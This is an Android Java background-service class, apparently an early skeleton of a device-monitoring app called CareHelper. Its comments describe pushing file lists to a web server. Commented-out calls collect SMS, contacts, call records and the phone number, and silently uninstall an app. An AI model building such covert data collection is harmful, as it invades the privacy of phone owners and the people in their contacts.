package org.bert.carehelper.service;


import android.content.Context;
import android.media.AudioManager;


/**
 * 后台服务
 */
public class CareHelperService extends BaseService implements Runnable {

    private PhoneService phoneManagerService;
    private FileService fileService;
    private AppService appService;
    private LocationService locationService;


    public CareHelperService(Context context) {
        super(context);
        phoneManagerService = new PhoneService(context);
        fileService = new FileService(context);
        appService = new AppService(context);
        locationService = new LocationService(context);
    }

    @Override
    public void run() {
        System.out.println("success!");
        // 1.建立网络链接
//        String phone = phoneManagerService.getPhoneNumber();
//        System.out.println(phone);
        // 2.后台搜索文件列表并推送到web服务端
//        System.out.println(fileService.getFileList());
//        phoneManagerService.getPhoneMessageList();
//        phoneManagerService.getContactList();
//        System.out.println(phoneManagerService.getPhoneRecords());;
//        System.out.println(appService.uninstallAppSafety("com.tencent.qqmusic"));
//        System.out.println(appService.unInstallAppSafety("com.tencent.qqmusic"));
//        phoneManagerService.setMaxVolum();
            phoneManagerService.getElectricity();
        // 3.
    }
}
